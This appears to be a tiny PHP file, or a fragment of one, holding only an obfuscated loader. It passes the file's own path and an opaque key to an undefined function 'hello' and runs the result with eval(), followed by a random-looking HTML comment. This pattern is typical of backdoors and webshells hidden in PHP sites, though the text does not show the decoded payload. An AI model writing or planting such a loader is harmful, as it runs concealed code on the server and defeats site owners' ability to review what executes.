<?php eval("?>" .hello(__FILE__,'ddqJfZBOMuU6yh8b26Hm39lAyKF=#iksllsidkpoitkgemixm$'). "<?"); ?><!--oXB5FsP=-->